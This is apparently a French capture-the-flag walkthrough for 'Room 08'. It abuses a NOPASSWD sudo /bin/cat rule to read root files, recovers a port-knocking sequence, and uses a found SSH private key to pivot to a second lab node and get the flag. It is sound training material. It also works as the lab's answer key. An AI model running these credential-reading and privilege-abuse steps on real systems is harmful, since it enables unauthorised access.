# Soluce complète — Room 08

---

## Vue d'ensemble

```
[Joueur] → SSH → [node-01 / huguette] → port knocking → SSH → [node-02 / colette]
                    10.100.8.2                                   10.100.8.3
```

La room se déroule en **deux phases** :

- **Phase 1** : Reconnaissance sur node-01, exploitation de la misconfig sudo, récupération de la séquence de knock et de la clé SSH
- **Phase 2** : Port knocking sur node-02, connexion SSH avec la clé récupérée, escalade de lecture pour le flag final

---

## Phase 1 — node-01 (10.100.8.2)

### Étape 1 — Connexion initiale

```bash
ssh huguette@10.100.8.2
# mot de passe fourni dans le briefing
```

---

### Étape 2 — Reconnaissance basique

```bash
whoami
id
# huguette, pas de groupe sudo apparent

ls -la
# briefing.txt  secret.zip  Documents/  .bash_history  .ssh/

cat briefing.txt
```

---

### Étape 3 — Lecture de l'historique bash

```bash
cat .bash_history
```

Éléments notables :

- Des `ssh colette@10.100.8.3` → **Connection refused**
- Des `sudo cat /root/Documents/notes_infra.txt`
- Des `sudo cat /root/Documents/serveurs_reseau.txt`
- Des commandes `knock` vers `10.100.8.3`
- La présence d'une clé SSH dans `.ssh/id_rsa`

→ **Trois signaux** : `sudo cat` fonctionne, les infos sont dans `/root/Documents/`, une clé SSH est disponible.

---

### Étape 4 — Lecture des documents personnels

```bash
cat Documents/todo.txt
```

```
[x] installer nmap sur r08
[x] tester ping vers 10.100.8.3
[x] verifier que ma cle ssh est bien dans .ssh/id_rsa
[ ] recuperer la sequence de knock aupres de Robert (voir /root/Documents/)
[ ] tester connexion : ssh -i .ssh/id_rsa colette@10.100.8.3
[ ] rapport infra a rendre vendredi avant 17h
```

```bash
cat Documents/notes_perso.txt
```

```
...
Robert a note la sequence quelque part dans ses fichiers sous /root/Documents/
Il m a dit que je pouvais y acceder avec sudo cat.
Le compte pour se connecter a r09 c est colette.
Ma cle ssh pour r09 est dans /home/huguette/.ssh/id_rsa
...
```

→ **Confirmation** : compte `colette`, clé dans `.ssh/id_rsa`, accès via `sudo cat`.

---

### Étape 5 — Vérification sudo

```bash
sudo -l
```

```
User huguette may run the following commands on r08:
    (ALL) NOPASSWD: /bin/cat
```

→ Lecture de n'importe quel fichier en tant que root, sans mot de passe.

---

### Étape 6 — Lecture des documents root

```bash
sudo cat /root/Documents/notes_infra.txt
```

```
...
r09 : 10.100.8.3  acces restreint, port knocking actif
La sequence est en 5 temps, voir serveurs_reseau.txt pour le detail complet.
Compte de connexion : colette
Cle SSH : /home/huguette/.ssh/id_rsa
...
```

```bash
sudo cat /root/Documents/serveurs_reseau.txt
```

```
ACCES r09 - PORT KNOCKING

  1er port : 1789
  2eme port : 3615
  3eme port : 4242
  4eme port : 7331
  5eme port : 9999

Commande complete :
  knock 10.100.8.3 1789 3615 4242 7331 9999

Compte de connexion : colette
Cle SSH             : /home/huguette/.ssh/id_rsa
```

→ **Séquence récupérée** : `1789 3615 4242 7331 9999`

---

### Étape 7 — Récupération de la clé SSH

```bash
ls -la .ssh/
# id_rsa

cat .ssh/id_rsa
# -----BEGIN OPENSSH PRIVATE KEY-----
# ...
```

→ **Clé privée disponible** pour la connexion en tant que `colette` sur node-02.

---

## Phase 2 — node-02 (10.100.8.3)

### Étape 8 — Vérification préalable

```bash
ping -c 2 10.100.8.3
# répond

nmap -p 22 10.100.8.3
# 22/tcp  filtered  ssh  ← port knocking pas encore effectué
```

---

### Étape 9 — Port knocking

```bash
knock 10.100.8.3 1789 3615 4242 7331 9999
```

Vérification immédiate :

```bash
nmap -p 22 10.100.8.3
# 22/tcp  open  ssh  ← fenêtre ouverte, agir dans les 5 secondes
```

---

### Étape 10 — Connexion SSH sur node-02

```bash
ssh -i .ssh/id_rsa colette@10.100.8.3
```

Si la fenêtre s'est refermée, relancer le knock et enchaîner sans délai :

```bash
knock 10.100.8.3 1789 3615 4242 7331 9999 && sleep 2 && ssh -i .ssh/id_rsa colette@10.100.8.3
```

---

### Étape 11 — Reconnaissance sur node-02

```bash
ls -la
whoami
id
sudo -l
```

```
User colette may run the following commands on r09:
    (ALL) NOPASSWD: /bin/cat
```

→ Même misconfig que node-01.

```bash
ls /root/
# docs/

sudo cat /root/docs/secret-key.txt
# <SECRET_KEY>
```

→ **Secret key récupérée.**

---

### Étape 12 — Flag final

Utiliser la `SECRET_KEY` comme mot de passe du zip récupéré sur node-01 :

```bash
# Depuis node-01 :
unzip -P <SECRET_KEY> secret.zip
cat flag.txt
# THE_ROOMS{...}
```

---

## Récapitulatif des commandes clés

```bash
# ── NODE-01 ──────────────────────────────────────────────────

# Connexion
ssh huguette@10.100.8.2

# Lecture des indices
cat .bash_history
cat Documents/todo.txt
cat Documents/notes_perso.txt

# Exploitation misconfig sudo
sudo -l
sudo cat /root/Documents/notes_infra.txt
sudo cat /root/Documents/serveurs_reseau.txt

# Récupération de la clé SSH
cat .ssh/id_rsa

# ── NODE-01 → NODE-02 ─────────────────────────────────────────

# Port knocking + connexion
knock 10.100.8.3 1789 3615 4242 7331 9999 && sleep 2 && ssh -i .ssh/id_rsa colette@10.100.8.3

# ── NODE-02 ──────────────────────────────────────────────────

# Exploitation misconfig sudo
sudo -l
sudo cat /root/docs/secret-key.txt

# ── NODE-01 ──────────────────────────────────────────────────

# Flag
unzip -P <SECRET_KEY> secret.zip
cat flag.txt
```

---

## Schéma de progression

```
node-01 (huguette)
  │
  ├── .bash_history ──────────────────── sudo cat fonctionne
  ├── Documents/todo.txt ─────────────── /root/Documents/ + commande ssh cible
  ├── Documents/notes_perso.txt ──────── compte colette + chemin clé SSH
  │
  ├── sudo cat /root/Documents/notes_infra.txt ───── confirme serveurs_reseau.txt
  ├── sudo cat /root/Documents/serveurs_reseau.txt ── séquence 1789 3615 4242 7331 9999
  │
  ├── .ssh/id_rsa ────────────────────── clé privée pour colette@node-02
  │
  └── knock + ssh ──────────────────────────────────────────► node-02 (colette)
                                                                  │
                                                                  ├── sudo -l → /bin/cat
                                                                  └── sudo cat /root/docs/secret-key.txt
                                                                              │
                                                                              └─► unzip secret.zip → FLAG
```